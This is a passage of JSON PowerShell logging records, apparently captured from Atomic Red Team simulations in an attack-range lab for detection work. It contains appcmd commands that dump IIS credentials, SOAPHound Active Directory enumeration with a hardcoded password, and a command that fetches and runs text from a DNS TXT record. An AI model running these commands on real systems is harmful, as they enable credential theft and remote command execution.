      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 3119,
      "full_command": "function Invoke-CleanupDescription() {\n    $ret1 = $test.description.ToString().trim() -replace '(?<!\\n)\\n(?!\\n)', ' ' #replace single linefeeds with a space\n    $ret1 -replace '\\n\\n', \"`n\" #replace double linefeeds with a single linefeed\n}\nfunction Show-Details ($test, $testCount, $technique, $customInputArgs, $PathToAtomicsFolder) {\n    # Header info\n    $tName = $technique.display_name.ToString() + \" \" + $technique.attack_technique\n    Write-Host -ForegroundColor Magenta \"[********BEGIN TEST*******]\"\n    Write-KeyValue \"Technique: \"  $tName\n    Write-KeyValue \"Atomic Test Name: \" $test.name.ToString()\n    Write-KeyValue \"Atomic Test Number: \" $testCount\n    if ($test.auto_generated_guid) { Write-KeyValue \"Atomic Test GUID: \" $test.auto_generated_guid }\n    Write-KeyValue \"Description: \" $(Invoke-CleanupDescription $test)\n\n    # Attack Commands\n    Write-Host -ForegroundColor Yellow \"`nAttack Commands:\"\n    $elevationRequired = $false\n    if ($nul -ne $test.executor.elevation_required ) { $elevationRequired = $test.executor.elevation_required }\n    $executor_name = $test.executor.name\n    Write-KeyValue \"Executor: \" $executor_name\n    Write-KeyValue \"ElevationRequired: \" $elevationRequired\n    $final_command = Merge-InputArgs $test.executor.command $test $customInputArgs $PathToAtomicsFolder\n    Write-KeyValue \"Command:`n\" $test.executor.command.trim()\n    if ($test.executor.command -ne $final_command) { Write-KeyValue \"Command (with inputs):`n\" $final_command.trim() }\n\n    # Cleanup Commands\n    if ($nul -ne $test.executor.cleanup_command) {\n        Write-Host -ForegroundColor Yellow \"`nCleanup Commands:\"\n        $final_command = Merge-InputArgs $test.executor.cleanup_command $test $customInputArgs $PathToAtomicsFolder\n        Write-KeyValue \"Command:`n\" $test.executor.cleanup_command.trim()\n        if ($test.executor.cleanup_command -ne $final_command) { Write-KeyValue \"Command (with inputs):`n\" $final_command.trim() }\n    }\n\n    # Dependencies\n    if ($nul -ne $test.dependencies) {\n        Write-Host -ForegroundColor Yellow \"`nDependencies:\"\n        foreach ($dep in $test.dependencies) {\n            $final_command_prereq = Merge-InputArgs $dep.prereq_command $test $customInputArgs $PathToAtomicsFolder\n            $final_command_get_prereq = Merge-InputArgs $dep.get_prereq_command $test $customInputArgs $PathToAtomicsFolder\n            $description = Merge-InputArgs $dep.description $test $customInputArgs $PathToAtomicsFolder\n            Write-KeyValue \"Description: \" $description.trim()\n            Write-KeyValue \"Check Prereq Command:`n\" $dep.prereq_command.trim()\n            if ( $dep.prereq_command -ne $final_command_prereq ) { Write-KeyValue \"Check Prereq Command (with inputs):`n\" $final_command_prereq.trim() }\n            Write-KeyValue \"Get Prereq Command:`n\" $dep.get_prereq_command.trim()\n            if ( $dep.get_prereq_command -ne $final_command_get_prereq ) { Write-KeyValue \"Get Prereq Command (with inputs):`n\" $final_command_get_prereq.trim() }\n        }\n    }\n    # Footer\n    Write-Host -ForegroundColor Magenta \"[!!!!!!!!END TEST!!!!!!!]`n`n\"\n\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:46.7469755+00:00",
      "event_id": 35709143,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 4,
      "full_command": "{$_}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:46.6974345+00:00",
      "event_id": 35709138,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 76,
      "full_command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list vdir \"WebShells/\" /text:password",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:45.6785394+00:00",
      "event_id": 35709066,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 16,
      "full_command": "$Env:SystemDrive",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:57.2923361+00:00",
      "event_id": 35711129,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 180,
      "full_command": "{C:\\AtomicRedTeam\\atomics\\T1059.001\\bin\\SOAPHound.exe --user $($env:USERNAME)@$($env:USERDOMAIN) --password P@ssword1 --dc 10.0.1.14 --buildcache --cachefilename c:\\temp\\cache.txt}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:46.4758123+00:00",
      "event_id": 35709118,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 95,
      "full_command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool \"WebShellsPool\" /text:processmodel.password",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.9559294+00:00",
      "event_id": 35710845,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 1266,
      "full_command": "class AtomicDependency {\n    [String] $description\n    [String] $prereq_command\n    [String] $get_prereq_command\n}\n\nclass AtomicInputArgument {\n    [String] $description\n    [String] $type\n    [String] $default\n}\n\nclass AtomicExecutorBase {\n    [String] $name\n    [Bool] $elevation_required\n\n    # Implemented to facilitate improved PS object display\n    [String] ToString() {\n        return $this.Name\n    }\n}\n\nclass AtomicExecutorDefault : AtomicExecutorBase {\n    [String] $command\n    [String] $cleanup_command\n}\n\nclass AtomicExecutorManual : AtomicExecutorBase {\n    [String] $steps\n    [String] $cleanup_command\n}\n\nclass AtomicTest {\n    [String] $name\n    [String] $auto_generated_guid\n    [String] $description\n    [String[]] $supported_platforms\n    # I wish this didn't have to be a hashtable but I don't\n    # want to change the schema and introduce a breaking change.\n    [Hashtable] $input_arguments\n    [String] $dependency_executor_name\n    [AtomicDependency[]] $dependencies\n    [AtomicExecutorBase] $executor\n\n    # Implemented to facilitate improved PS object display\n    [String] ToString() {\n        return $this.name\n    }\n}\n\nclass AtomicTechnique {\n    [String[]] $attack_technique\n    [String] $display_name\n    [AtomicTest[]] $atomic_tests\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:57.2919848+00:00",
      "event_id": 35711127,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 182,
      "full_command": "& {C:\\AtomicRedTeam\\atomics\\T1059.001\\bin\\SOAPHound.exe --user $($env:USERNAME)@$($env:USERDOMAIN) --password P@ssword1 --dc 10.0.1.14 --buildcache --cachefilename c:\\temp\\cache.txt}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:46.1157539+00:00",
      "event_id": 35709087,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 63,
      "full_command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppools /text:name",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:46.6386241+00:00",
      "event_id": 35709135,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 76,
      "full_command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list vdir \"WebShells/\" /text:userName",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:46.5974553+00:00",
      "event_id": 35709130,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 83,
      "full_command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list vdir \"Default Web Site/\" /text:password",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:57.2900244+00:00",
      "event_id": 35711121,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 591,
      "full_command": "function Write-PrereqResults ($FailureReasons, $testId) {\n    if ($FailureReasons.Count -eq 0) {\n        Write-KeyValue \"Prerequisites met: \" $testId\n    }\n    else {\n        Write-Host -ForegroundColor Red \"Prerequisites not met: $testId\"\n        foreach ($reason in $FailureReasons) {\n            Write-Host -ForegroundColor Yellow -NoNewline \"`t[*] $reason\"\n        }\n        Write-Host -ForegroundColor Yellow -NoNewline \"`nTry installing prereq's with the \"\n        Write-Host -ForegroundColor Cyan -NoNewline \"-GetPrereqs\"\n        Write-Host -ForegroundColor Yellow  \" switch\"\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:46.1659693+00:00",
      "event_id": 35709091,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 96,
      "full_command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool \"DefaultAppPool\" /text:processmodel.username",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:46.209966+00:00",
      "event_id": 35709094,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 96,
      "full_command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool \"DefaultAppPool\" /text:processmodel.password",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:46.2538864+00:00",
      "event_id": 35709099,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 99,
      "full_command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool \".NET v4.5 Classic\" /text:processmodel.username",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:46.2982094+00:00",
      "event_id": 35709102,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 99,
      "full_command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool \".NET v4.5 Classic\" /text:processmodel.password",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:46.3425831+00:00",
      "event_id": 35709107,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 91,
      "full_command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool \".NET v4.5\" /text:processmodel.username",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:46.3870438+00:00",
      "event_id": 35709110,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 91,
      "full_command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool \".NET v4.5\" /text:processmodel.password",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:46.4315056+00:00",
      "event_id": 35709115,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 95,
      "full_command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool \"WebShellsPool\" /text:processmodel.username",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:57.2869485+00:00",
      "event_id": 35711118,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 392,
      "full_command": "function Write-KeyValue ($key, $value) {\n    Write-Host -ForegroundColor Cyan -NoNewline $key\n    $split = $value -split \"(#{[a-z-_A-Z]*})\"\n    foreach ($s in $split) {\n        if ($s -match \"(#{[a-z-_A-Z]*})\") {\n            Write-Host -ForegroundColor Red -NoNewline $s\n        }\n        else {\n            Write-Host -ForegroundColor Green -NoNewline $s\n        }\n    }\n    Write-Host \"\"\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:46.095971+00:00",
      "event_id": 35709077,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 4,
      "full_command": "{$_}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:46.5588871+00:00",
      "event_id": 35709127,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 83,
      "full_command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list vdir \"Default Web Site/\" /text:userName",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.2887219+00:00",
      "event_id": 35710748,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 8,
      "full_command": ". whoami",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.5973401+00:00",
      "event_id": 35710812,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 186,
      "full_command": "\nImport-Module \"C:\\AtomicRedTeam\\invoke-atomicredteam\\Invoke-AtomicRedTeam.psd1\" -Force \n$PSDefaultParameterValues = @{\"Invoke-AtomicTest:PathToAtomicsFolder\"=\"C:\\AtomicRedTeam\\atomics\"}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:56.1573615+00:00",
      "event_id": 35710939,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 213,
      "full_command": "& {C:\\AtomicRedTeam\\atomics\\T1059.001\\bin\\SOAPHound.exe --user $env:USERNAME --password P@ssword1 --domain $env:USERDOMAIN --dc 10.0.1.14 --bhdump --cachefilename c:\\temp\\cache.txt --outputdirectory c:\\temp\\test2}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.0712728+00:00",
      "event_id": 35710654,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 1266,
      "full_command": "class AtomicDependency {\n    [String] $description\n    [String] $prereq_command\n    [String] $get_prereq_command\n}\n\nclass AtomicInputArgument {\n    [String] $description\n    [String] $type\n    [String] $default\n}\n\nclass AtomicExecutorBase {\n    [String] $name\n    [Bool] $elevation_required\n\n    # Implemented to facilitate improved PS object display\n    [String] ToString() {\n        return $this.Name\n    }\n}\n\nclass AtomicExecutorDefault : AtomicExecutorBase {\n    [String] $command\n    [String] $cleanup_command\n}\n\nclass AtomicExecutorManual : AtomicExecutorBase {\n    [String] $steps\n    [String] $cleanup_command\n}\n\nclass AtomicTest {\n    [String] $name\n    [String] $auto_generated_guid\n    [String] $description\n    [String[]] $supported_platforms\n    # I wish this didn't have to be a hashtable but I don't\n    # want to change the schema and introduce a breaking change.\n    [Hashtable] $input_arguments\n    [String] $dependency_executor_name\n    [AtomicDependency[]] $dependencies\n    [AtomicExecutorBase] $executor\n\n    # Implemented to facilitate improved PS object display\n    [String] ToString() {\n        return $this.name\n    }\n}\n\nclass AtomicTechnique {\n    [String[]] $attack_technique\n    [String] $display_name\n    [AtomicTest[]] $atomic_tests\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:56.1576319+00:00",
      "event_id": 35710941,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 211,
      "full_command": "{C:\\AtomicRedTeam\\atomics\\T1059.001\\bin\\SOAPHound.exe --user $env:USERNAME --password P@ssword1 --domain $env:USERDOMAIN --dc 10.0.1.14 --bhdump --cachefilename c:\\temp\\cache.txt --outputdirectory c:\\temp\\test2}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:56.4717016+00:00",
      "event_id": 35710945,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 9,
      "full_command": "$global:?",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.797845+00:00",
      "event_id": 35710635,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 650,
      "full_command": "function Initialize-Assemblies {\n    $requiredTypes = @(\n        \"Parser\", \"MergingParser\", \"YamlStream\",\n        \"YamlMappingNode\", \"YamlSequenceNode\",\n        \"YamlScalarNode\", \"ChainedEventEmitter\",\n        \"Serializer\", \"Deserializer\", \"SerializerBuilder\",\n        \"StaticTypeResolver\"\n    )\n\n    $type = \"YamlDotNet.Serialization.Serializer\" -as [type]\n    if (!$type) {\n        return Load-Assembly\n    }\n\n    $yaml = $type.Assembly\n    foreach ($i in $requiredTypes){\n        if ($i -notin $yaml.DefinedTypes.Name) {\n            Throw \"YamlDotNet is loaded but missing required types ($i). Older version installed on system?\"\n        }\n    }\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:56.7176136+00:00",
      "event_id": 35710997,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 58,
      "full_command": ". 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1'",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:56.737206+00:00",
      "event_id": 35710999,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 186,
      "full_command": "\nImport-Module \"C:\\AtomicRedTeam\\invoke-atomicredteam\\Invoke-AtomicRedTeam.psd1\" -Force \n$PSDefaultParameterValues = @{\"Invoke-AtomicTest:PathToAtomicsFolder\"=\"C:\\AtomicRedTeam\\atomics\"}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:56.8269253+00:00",
      "event_id": 35711013,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 650,
      "full_command": "function Initialize-Assemblies {\n    $requiredTypes = @(\n        \"Parser\", \"MergingParser\", \"YamlStream\",\n        \"YamlMappingNode\", \"YamlSequenceNode\",\n        \"YamlScalarNode\", \"ChainedEventEmitter\",\n        \"Serializer\", \"Deserializer\", \"SerializerBuilder\",\n        \"StaticTypeResolver\"\n    )\n\n    $type = \"YamlDotNet.Serialization.Serializer\" -as [type]\n    if (!$type) {\n        return Load-Assembly\n    }\n\n    $yaml = $type.Assembly\n    foreach ($i in $requiredTypes){\n        if ($i -notin $yaml.DefinedTypes.Name) {\n            Throw \"YamlDotNet is loaded but missing required types ($i). Older version installed on system?\"\n        }\n    }\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.7036018+00:00",
      "event_id": 35710621,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 186,
      "full_command": "\nImport-Module \"C:\\AtomicRedTeam\\invoke-atomicredteam\\Invoke-AtomicRedTeam.psd1\" -Force \n$PSDefaultParameterValues = @{\"Invoke-AtomicTest:PathToAtomicsFolder\"=\"C:\\AtomicRedTeam\\atomics\"}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.6833212+00:00",
      "event_id": 35710619,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 58,
      "full_command": ". 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1'",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.4916586+00:00",
      "event_id": 35710613,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 90,
      "full_command": "function nslookup { &\"$env:windir\\system32\\nslookup.exe\" @args | Out-Null; @(\"\",\"whoami\")}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.4906782+00:00",
      "event_id": 35710611,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 326,
      "full_command": "{# creating a custom nslookup function that will indeed call nslookup but forces the result to be \"whoami\"\n# this would not be part of a real attack but helpful for this simulation\nfunction nslookup { &\"$env:windir\\system32\\nslookup.exe\" @args | Out-Null; @(\"\",\"whoami\")}\npowershell .(nslookup -q=txt example.com 8.8.8.8)[-1]}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.4903236+00:00",
      "event_id": 35710609,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 328,
      "full_command": "& {# creating a custom nslookup function that will indeed call nslookup but forces the result to be \"whoami\"\n# this would not be part of a real attack but helpful for this simulation\nfunction nslookup { &\"$env:windir\\system32\\nslookup.exe\" @args | Out-Null; @(\"\",\"whoami\")}\npowershell .(nslookup -q=txt example.com 8.8.8.8)[-1]}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.4882755+00:00",
      "event_id": 35710603,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 591,
      "full_command": "function Write-PrereqResults ($FailureReasons, $testId) {\n    if ($FailureReasons.Count -eq 0) {\n        Write-KeyValue \"Prerequisites met: \" $testId\n    }\n    else {\n        Write-Host -ForegroundColor Red \"Prerequisites not met: $testId\"\n        foreach ($reason in $FailureReasons) {\n            Write-Host -ForegroundColor Yellow -NoNewline \"`t[*] $reason\"\n        }\n        Write-Host -ForegroundColor Yellow -NoNewline \"`nTry installing prereq's with the \"\n        Write-Host -ForegroundColor Cyan -NoNewline \"-GetPrereqs\"\n        Write-Host -ForegroundColor Yellow  \" switch\"\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.4847627+00:00",
      "event_id": 35710600,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 392,
      "full_command": "function Write-KeyValue ($key, $value) {\n    Write-Host -ForegroundColor Cyan -NoNewline $key\n    $split = $value -split \"(#{[a-z-_A-Z]*})\"\n    foreach ($s in $split) {\n        if ($s -match \"(#{[a-z-_A-Z]*})\") {\n            Write-Host -ForegroundColor Red -NoNewline $s\n        }\n        else {\n            Write-Host -ForegroundColor Green -NoNewline $s\n        }\n    }\n    Write-Host \"\"\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.4816265+00:00",
      "event_id": 35710597,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 3119,
      "full_command": "function Invoke-CleanupDescription() {\n    $ret1 = $test.description.ToString().trim() -replace '(?<!\\n)\\n(?!\\n)', ' ' #replace single linefeeds with a space\n    $ret1 -replace '\\n\\n', \"`n\" #replace double linefeeds with a single linefeed\n}\nfunction Show-Details ($test, $testCount, $technique, $customInputArgs, $PathToAtomicsFolder) {\n    # Header info\n    $tName = $technique.display_name.ToString() + \" \" + $technique.attack_technique\n    Write-Host -ForegroundColor Magenta \"[********BEGIN TEST*******]\"\n    Write-KeyValue \"Technique: \"  $tName\n    Write-KeyValue \"Atomic Test Name: \" $test.name.ToString()\n    Write-KeyValue \"Atomic Test Number: \" $testCount\n    if ($test.auto_generated_guid) { Write-KeyValue \"Atomic Test GUID: \" $test.auto_generated_guid }\n    Write-KeyValue \"Description: \" $(Invoke-CleanupDescription $test)\n\n    # Attack Commands\n    Write-Host -ForegroundColor Yellow \"`nAttack Commands:\"\n    $elevationRequired = $false\n    if ($nul -ne $test.executor.elevation_required ) { $elevationRequired = $test.executor.elevation_required }\n    $executor_name = $test.executor.name\n    Write-KeyValue \"Executor: \" $executor_name\n    Write-KeyValue \"ElevationRequired: \" $elevationRequired\n    $final_command = Merge-InputArgs $test.executor.command $test $customInputArgs $PathToAtomicsFolder\n    Write-KeyValue \"Command:`n\" $test.executor.command.trim()\n    if ($test.executor.command -ne $final_command) { Write-KeyValue \"Command (with inputs):`n\" $final_command.trim() }\n\n    # Cleanup Commands\n    if ($nul -ne $test.executor.cleanup_command) {\n        Write-Host -ForegroundColor Yellow \"`nCleanup Commands:\"\n        $final_command = Merge-InputArgs $test.executor.cleanup_command $test $customInputArgs $PathToAtomicsFolder\n        Write-KeyValue \"Command:`n\" $test.executor.cleanup_command.trim()\n        if ($test.executor.cleanup_command -ne $final_command) { Write-KeyValue \"Command (with inputs):`n\" $final_command.trim() }\n    }\n\n    # Dependencies\n    if ($nul -ne $test.dependencies) {\n        Write-Host -ForegroundColor Yellow \"`nDependencies:\"\n        foreach ($dep in $test.dependencies) {\n            $final_command_prereq = Merge-InputArgs $dep.prereq_command $test $customInputArgs $PathToAtomicsFolder\n            $final_command_get_prereq = Merge-InputArgs $dep.get_prereq_command $test $customInputArgs $PathToAtomicsFolder\n            $description = Merge-InputArgs $dep.description $test $customInputArgs $PathToAtomicsFolder\n            Write-KeyValue \"Description: \" $description.trim()\n            Write-KeyValue \"Check Prereq Command:`n\" $dep.prereq_command.trim()\n            if ( $dep.prereq_command -ne $final_command_prereq ) { Write-KeyValue \"Check Prereq Command (with inputs):`n\" $final_command_prereq.trim() }\n            Write-KeyValue \"Get Prereq Command:`n\" $dep.get_prereq_command.trim()\n            if ( $dep.get_prereq_command -ne $final_command_get_prereq ) { Write-KeyValue \"Get Prereq Command (with 